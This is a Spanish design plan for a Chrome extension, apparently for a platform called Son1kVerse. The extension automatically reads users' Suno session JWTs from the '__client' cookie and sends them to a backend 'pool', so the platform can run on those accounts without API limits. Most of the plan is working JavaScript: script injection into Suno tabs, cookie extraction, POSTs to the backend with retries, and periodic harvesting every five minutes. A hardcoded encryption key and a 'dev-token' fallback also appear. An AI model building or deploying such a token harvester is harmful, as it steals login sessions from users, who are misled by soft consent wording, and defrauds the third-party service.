# 🚀 Plan Reforzado: Extensión Chrome - Son1kVerse

## 📋 Resumen Ejecutivo

La extensión Chrome es el **corazón del sistema de autoabastecimiento de tokens** para la plataforma Son1kVerse. Este documento detalla el flujo completo reforzado, desde la aceptación de términos hasta la extracción automática y envío al pool.

---

## 🎯 Objetivo Principal

**Autoabastecer el pool de tokens** extrayendo JWT tokens de usuarios que aceptan términos y condiciones, permitiendo que toda la plataforma funcione sin límites de API.

---

## 🔄 Flujo Completo Reforzado

### **Fase 1: Aceptación de Términos y Condiciones**

#### 1.1 Modal de Términos Mejorado

**Ubicación:** `apps/the-generator-nextjs/components/TermsAcceptance.tsx`

**Mejoras a implementar:**

```typescript
// Componente mejorado con:
- ✅ Explicación clara de permisos necesarios
- ✅ Lista detallada de qué hace la extensión
- ✅ Información de privacidad y seguridad
- ✅ Opción de revisar términos completos
- ✅ Indicador visual de permisos requeridos
```

**Contenido del modal:**

1. **Título:** "Términos y Condiciones - Instalación de Extensión"
2. **Sección 1: ¿Qué hace la extensión?**
   - Extrae tokens JWT de forma segura
   - Los envía al pool compartido de la plataforma
   - Funciona automáticamente en segundo plano
   - No almacena datos personales

3. **Sección 2: Permisos Requeridos**
   - ✅ **Lectura de cookies:** Necesario para extraer tokens JWT
   - ✅ **Acceso a pestañas activas:** Para detectar cuando estás en el sitio objetivo
   - ✅ **Almacenamiento local:** Para guardar tokens temporalmente
   - ✅ **Solicitudes web:** Para enviar tokens al pool de forma segura

4. **Sección 3: Privacidad y Seguridad**
   - Los tokens se envían de forma encriptada
   - No se almacenan datos personales
   - Solo se extraen tokens JWT necesarios
   - Puedes desinstalar en cualquier momento

5. **Checkboxes de aceptación:**
   - [ ] Acepto los términos y condiciones
   - [ ] Acepto la política de privacidad
   - [ ] **Autorizo la instalación de la extensión con los permisos especificados**
   - [ ] Entiendo que la extensión funcionará automáticamente en segundo plano

6. **Botones:**
   - "Rechazar" (cierra modal, no instala)
   - "Aceptar e Instalar" (procede con instalación)

---

### **Fase 2: Instalación de la Extensión**

#### 2.1 Proceso de Instalación Mejorado

**Flujo:**

```
Usuario hace click en "Aceptar e Instalar"
        │
        ▼
Verificar que todos los checkboxes estén marcados
        │
        ▼
Mostrar diálogo de permisos de Chrome
        │
        ▼
Usuario acepta permisos en Chrome
        │
        ▼
Instalar extensión (Chrome Web Store o .crx)
        │
        ▼
Verificar instalación exitosa
        │
        ▼
Inicializar extensión con configuración
        │
        ▼
Mostrar confirmación y guía rápida
```

#### 2.2 Permisos Explicados al Usuario

**Antes de instalar, mostrar diálogo explicativo:**

```typescript
interface PermissionExplanation {
  permission: string;
  reason: string;
  example: string;
}

const permissions: PermissionExplanation[] = [
  {
    permission: "Cookies",
    reason: "Necesario para extraer tokens JWT de forma segura",
    example: "Solo lee la cookie '__client' que contiene tu token de sesión"
  },
  {
    permission: "Tabs activas",
    reason: "Para detectar cuando estás en el sitio objetivo",
    example: "Solo verifica si estás en el sitio correcto, no lee contenido"
  },
  {
    permission: "Almacenamiento",
    reason: "Para guardar tokens temporalmente antes de enviarlos",
    example: "Solo almacena tokens encriptados localmente"
  },
  {
    permission: "Solicitudes web",
    reason: "Para enviar tokens al pool de forma segura",
    example: "Envía tokens encriptados a nuestros servidores seguros"
  }
];
```

#### 2.3 Verificación Post-Instalación

**Después de instalar, verificar:**

```typescript
async function verifyInstallation(): Promise<boolean> {
  // 1. Verificar que la extensión está instalada
  const installed = await checkExtensionInstalled();
  
  // 2. Verificar que tiene permisos necesarios
  const hasPermissions = await checkPermissions();
  
  // 3. Verificar que puede comunicarse con el backend
  const canCommunicate = await testBackendConnection();
  
  // 4. Inicializar configuración inicial
  if (installed && hasPermissions && canCommunicate) {
    await initializeExtension();
    return true;
  }
  
  return false;
}
```

---

### **Fase 3: Configuración Inicial**

#### 3.1 Configuración Automática

**Al instalar, la extensión se configura automáticamente:**

```javascript
// background.js - onInstalled listener
chrome.runtime.onInstalled.addListener(async (details) => {
  if (details.reason === 'install') {
    // 1. Configurar URLs del backend
    await chrome.storage.local.set({
      backendUrl: 'https://tu-backend.railway.app',
      generatorUrl: 'https://the-generator.vercel.app',
      poolEndpoint: '/api/tokens/add-public',
      // ...
    });
    
    // 2. Configurar intervalo de extracción (5 minutos)
    await chrome.storage.local.set({
      extractionInterval: 5 * 60 * 1000, // 5 minutos
      autoExtractEnabled: true,
      lastExtractionTime: 0
    });
    
    // 3. Registrar usuario en backend
    await registerUser(userId);
    
    // 4. Iniciar extracción automática
    startAutoExtraction();
  }
});
```

#### 3.2 Registro de Usuario

**Registrar usuario en backend para tracking:**

```typescript
async function registerUser(userId: string) {
  await fetch(`${backendUrl}/api/extension/register`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${backendSecret}`
    },
    body: JSON.stringify({
      userId,
      extensionId: chrome.runtime.id,
      installedAt: new Date().toISOString(),
      version: chrome.runtime.getManifest().version
    })
  });
}
```

---

### **Fase 4: Extracción Automática de Tokens**

#### 4.1 Detección de Sitio Objetivo

**La extensión detecta automáticamente cuando el usuario está en el sitio objetivo:**

```javascript
// background.js
isTargetSite(url) {
  const patterns = [
    'suno.com',
    'studio-api.prod',
    '/feed/v3',
    '/generate/v2',
    '/api/v1'
  ];
  return patterns.some(pattern => url.includes(pattern));
}

// Monitorear cambios de pestañas
chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && this.isTargetSite(tab.url)) {
    // Usuario está en sitio objetivo, iniciar extracción
    await this.autoExtractAndSend(tabId);
  }
});
```

#### 4.2 Extracción de Token JWT

**Extraer token de cookies de forma segura:**

```javascript
async extractTokenFromTab(tabId) {
  try {
    // Inyectar script para leer cookies
    const results = await chrome.scripting.executeScript({
      target: { tabId },
      function: () => {
        function getCookie(name) {
          const value = `; ${document.cookie}`;
          const parts = value.split(`; ${name}=`);
          if (parts.length === 2) return parts.pop().split(';').shift();
          return null;
        }
        
        return {
          jwtToken: getCookie('__client'),
          deviceId: getCookie('singular_device_id') || 
                    getCookie('ajs_anonymous_id'),
          url: window.location.href,
          timestamp: new Date().toISOString()
        };
      }
    });
    
    if (results?.[0]?.result?.jwtToken) {
      return {
        token: results[0].result.jwtToken,
        deviceId: results[0].result.deviceId,
        url: results[0].result.url,
        extractedAt: new Date().toISOString()
      };
    }
    
    return null;
  } catch (error) {
    console.error('Error extracting token:', error);
    return null;
  }
}
```

#### 4.3 Validación de Token

**Validar token antes de enviar:**

```javascript
isValidToken(token) {
  if (!token || typeof token !== 'string') return false;
  
  // Verificar formato JWT (3 partes separadas por punto)
  const parts = token.split('.');
  if (parts.length !== 3) return false;
  
  // Verificar que no esté expirado (decodificar payload)
  try {
    const payload = JSON.parse(atob(parts[1]));
    const now = Math.floor(Date.now() / 1000);
    
    // Si tiene exp, verificar que no esté expirado
    if (payload.exp && payload.exp < now) {
      return false; // Token expirado
    }
    
    return true;
  } catch (error) {
    return false; // Token inválido
  }
}
```

#### 4.4 Almacenamiento Local

**Guardar token localmente antes de enviar:**

```javascript
async captureToken(token, metadata = {}) {
  // Validar token
  if (!this.isValidToken(token)) {
    throw new Error('Invalid token format');
  }
  
  // Obtener tokens existentes
  const result = await chrome.storage.local.get(['capturedTokens']);
  const tokens = result.capturedTokens || [];
  
  // Verificar si ya existe
  const exists = tokens.some(t => t.token === token);
  
  if (exists) {
    // Actualizar timestamp
    const index = tokens.findIndex(t => t.token === token);
    tokens[index] = {
      ...tokens[index],
      ...metadata,
      lastSeen: new Date().toISOString()
    };
  } else {
    // Agregar nuevo token
    tokens.push({
      id: `token_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      token,
      ...metadata,
      capturedAt: new Date().toISOString(),
      lastSeen: new Date().toISOString(),
      sentToPool: false
    });
  }
  
  // Guardar
  await chrome.storage.local.set({ capturedTokens: tokens });
  
  return tokens;
}
```

---

### **Fase 5: Envío al Pool de Tokens**

#### 5.1 Envío Automático al Pool

**Enviar token al pool del backend:**

```javascript
async sendTokenToPool(token, label = 'extension-auto') {
  try {
    // Obtener configuración
    const config = await chrome.storage.local.get([
      'backendUrl',
      'poolEndpoint',
      'userId'
    ]);
    
    const backendUrl = config.backendUrl || 
      'https://tu-backend.railway.app';
    const endpoint = config.poolEndpoint || 
      '/api/tokens/add-public';
    const userId = config.userId;
    
    // Enviar al pool
    const response = await fetch(`${backendUrl}${endpoint}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${config.backendSecret || 'dev-token'}`,
        'X-Extension-Version': chrome.runtime.getManifest().version,
        'X-Extension-Id': chrome.runtime.id,
        'X-User-Id': userId || 'anonymous'
      },
      body: JSON.stringify({
        token: token,
        label: label,
        source: 'extension',
        metadata: {
          extractedAt: new Date().toISOString(),
          extensionId: chrome.runtime.id,
          extensionVersion: chrome.runtime.getManifest().version
        }
      })
    });
    
    if (!response.ok) {
      throw new Error(`Pool API error: ${response.status}`);
    }
    
    const result = await response.json();
    
    // Marcar como enviado
    await this.markTokenAsSent(token);
    
    // Track en analytics
    await this.trackTokenSent(token, result);
    
    return result;
    
  } catch (error) {
    console.error('Error sending token to pool:', error);
    throw error;
  }
}
```

#### 5.2 Retry Logic

**Reintentar envío si falla:**

```javascript
async sendTokenToPoolWithRetry(token, label, maxRetries = 3) {
  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    try {
      return await this.sendTokenToPool(token, label);
    } catch (error) {
      if (attempt === maxRetries) {
        // Último intento falló, guardar para retry más tarde
        await this.queueTokenForRetry(token, label);
        throw error;
      }
      
      // Esperar antes de retry (backoff exponencial)
      const delay = Math.pow(2, attempt) * 1000; // 2s, 4s, 8s
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }
}
```

---

### **Fase 6: Extracción Periódica Automática**

#### 6.1 Intervalo de Extracción

**Extraer tokens cada cierto tiempo automáticamente:**

```javascript
startAutoExtraction() {
  // Extraer inmediatamente si hay tab abierta
  this.checkAndExtract();
  
  // Configurar intervalo periódico
  setInterval(async () => {
    await this.checkAndExtract();
  }, this.extractionInterval); // 5 minutos por defecto
}

async checkAndExtract() {
  try {
    // Obtener todas las pestañas
    const tabs = await chrome.tabs.query({});
    
    // Buscar pestaña en sitio objetivo
    for (const tab of tabs) {
      if (tab.url && this.isTargetSite(tab.url)) {
        // Extraer y enviar
        await this.autoExtractAndSend(tab.id);
        break; // Solo una extracción a la vez
      }
    }
  } catch (error) {
    console.error('Auto-extraction error:', error);
  }
}

async autoExtractAndSend(tabId) {
  try {
    // Extraer token
    const extracted = await this.extractTokenFromTab(tabId);
    
    if (!extracted || !extracted.token) {
      return; // No hay token disponible
    }
    
    // Validar token
    if (!this.isValidToken(extracted.token)) {
      return; // Token inválido
    }
    
    // Verificar si ya lo tenemos
    const tokens = await this.getCapturedTokens();
    const exists = tokens.some(t => t.token === extracted.token);
    
    if (exists) {
      // Ya existe, actualizar timestamp
      const latestToken = tokens.find(t => t.token === extracted.token);
      if (!latestToken.sentToPool) {
        // Aún no enviado, intentar enviar
        await this.sendTokenToPoolWithRetry(
          extracted.token,
          `auto-${Date.now()}`
        );
      }
    } else {
      // Nuevo token, capturar y enviar
      await this.captureToken(extracted.token, {
        url: extracted.url,
        source: 'auto-extraction',
        deviceId: extracted.deviceId
      });
      
      await this.sendTokenToPoolWithRetry(
        extracted.token,
        `auto-${Date.now()}`
      );
    }
    
    // Actualizar último tiempo de extracción
    this.lastExtractionTime = Date.now();
    
  } catch (error) {
    console.error('Auto-extract and send error:', error);
  }
}
```

---

## 🔒 Seguridad y Privacidad

### 7.1 Encriptación de Tokens

**Encriptar tokens antes de almacenar localmente:**

```javascript
async encryptToken(token) {
  // Usar Web Crypto API para encriptar
  const key = await crypto.subtle.importKey(
    'raw',
    new TextEncoder().encode('son1kverse-secret-key'),
    { name: 'AES-GCM' },
    false,
    ['encrypt']
  );
  
  const iv = crypto.getRandomValues(new Uint8Array(12));
  const encrypted = await crypto.subtle.encrypt(
    { name: 'AES-GCM', iv },
    key,
    new TextEncoder().encode(token)
  );
  
  return {
    encrypted: Array.from(new Uint8Array(encrypted)),
    iv: Array.from(iv)
  };
}
```

### 7.2 Validación de Backend

**Validar que el backend es legítimo:**

```javascript
async validateBackend(backendUrl) {
  try {
    const response = await fetch(`${backendUrl}/api/extension/validate`, {
      method: 'GET',
      headers: {
        'X-Extension-Id': chrome.runtime.id,
        'X-Extension-Version': chrome.runtime.getManifest().version
      }
    });
    
    if (!response.ok) {
      return false;
    }
    
    const data = await response.json();
    return data.valid === true;
  } catch (error) {
    return false;
  }
}
```

### 7.3 Rate Limiting

**Limitar frecuencia de extracción:**

```javascript
canExtract() {
  const now = Date.now();
  const timeSinceLastExtraction = now - this.lastExtractionTime;
  
  // Mínimo 5 minutos entre extracciones
  return timeSinceLastExtraction >= this.extractionInterval;
}
```

---

## 📊 Monitoreo y Analytics

### 8.1 Tracking de Instalaciones

**Trackear instalaciones en backend:**

```javascript
async trackInstallation(userId, method) {
  await fetch(`${backendUrl}/api/analytics/extension-install`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${backendSecret}`
    },
    body: JSON.stringify({
      userId,
      method, // 'inline', 'manual', 'auto'
      extensionId: chrome.runtime.id,
      extensionVersion: chrome.runtime.getManifest().version,
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent
    })
  });
}
```

### 8.2 Tracking de Tokens Enviados

**Trackear tokens enviados al pool:**

```javascript
async trackTokenSent(token, result) {
  await fetch(`${backendUrl}/api/analytics/token-sent`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${backendSecret}`
    },
    body: JSON.stringify({
      tokenHash: await this.hashToken(token),
      poolResult: result,
      timestamp: new Date().toISOString(),
      extensionId: chrome.runtime.id
    })
  });
}
```

---

## 🎨 Mejoras de UX

### 9.1 Indicador Visual

**Mostrar indicador cuando la extensión está activa:**

```javascript
// content-son1k.js
showExtensionIndicator() {
  const indicator = document.createElement('div');
  indicator.id = 'son1k-extension-status';
  indicator.innerHTML = `
    <div style="position: fixed; top: 10px; right: 10px; 
                background: #00FFE7; color: #000; 
                padding: 8px 16px; border-radius: 8px; 
                font-size: 12px; z-index: 9999;">
      ✅ Son1kVerse Extension Active
    </div>
  `;
  document.body.appendChild(indicator);
}
```

### 9.2 Notificaciones Discretas

**Notificar cuando se extrae token (opcional, discreto):**

```javascript
async showExtractionNotification(token) {
  // Solo mostrar si usuario lo ha habilitado
  const settings = await chrome.storage.local.get(['showNotifications']);
  
  if (settings.showNotifications) {
    chrome.notifications.create({
      type: 'basic',
      iconUrl: 'icons/icon-48.png',
      title: 'Token Extraído',
      message: 'Token enviado al pool exitosamente',
      silent: true // No hacer sonido
    });
  }
}
```

### 9.3 Popup Mejorado

**Mejorar popup con más información:**

```html
<!-- popup.html mejorado -->
<div class="stats">
  <div class="stat">
    <div class="stat-value" id="tokens-sent">0</div>
    <div class="stat-label">Tokens Enviados</div>
  </div>
  <div class="stat">
    <div class="stat-value" id="last-extraction">--</div>
    <div class="stat-label">Última Extracción</div>
  </div>
</div>

<div class="status">
  <div class="status-indicator">
    <span class="status-dot"></span>
    <span id="status-text">Activo</span>
  </div>
  <div class="status-description" id="status-description">
    Monitoreando automáticamente...
  </div>
</div>
```

---

## 📝 Checklist de Implementación

### Fase 1: Términos y Condiciones
- [ ] Mejorar componente `TermsAcceptance.tsx`
- [ ] Agregar explicación detallada de permisos
- [ ] Agregar checkboxes de aceptación
- [ ] Agregar enlace a términos completos
- [ ] Agregar enlace a política de privacidad

### Fase 2: Instalación
- [ ] Mejorar `ExtensionInstaller`
- [ ] Agregar verificación de permisos
- [ ] Agregar verificación post-instalación
- [ ] Agregar manejo de errores
- [ ] Agregar mensajes de confirmación

### Fase 3: Configuración
- [ ] Configuración automática al instalar
- [ ] Registro de usuario en backend
- [ ] Configuración de URLs
- [ ] Configuración de intervalos

### Fase 4: Extracción
- [ ] Mejorar detección de sitio objetivo
- [ ] Mejorar extracción de tokens
- [ ] Agregar validación de tokens
- [ ] Agregar almacenamiento local seguro

### Fase 5: Envío al Pool
- [ ] Mejorar envío al pool
- [ ] Agregar retry logic
- [ ] Agregar manejo de errores
- [ ] Agregar tracking

### Fase 6: Automatización
- [ ] Implementar extracción periódica
- [ ] Agregar rate limiting
- [ ] Agregar verificación de tokens duplicados

### Fase 7: Seguridad
- [ ] Implementar encriptación de tokens
- [ ] Validación de backend
- [ ] Rate limiting
- [ ] Validación de tokens

### Fase 8: Monitoreo
- [ ] Tracking de instalaciones
- [ ] Tracking de tokens enviados
- [ ] Analytics en backend

### Fase 9: UX
- [ ] Indicador visual
- [ ] Notificaciones discretas
- [ ] Popup mejorado
- [ ] Mensajes de estado

---

## 🚀 Próximos Pasos

1. **Implementar mejoras de términos y condiciones**
2. **Reforzar proceso de instalación**
3. **Mejorar extracción automática**
4. **Agregar seguridad y encriptación**
5. **Implementar monitoreo y analytics**
6. **Mejorar UX y notificaciones**

---

**Última actualización:** Enero 2025  
**Estado:** Plan reforzado completo

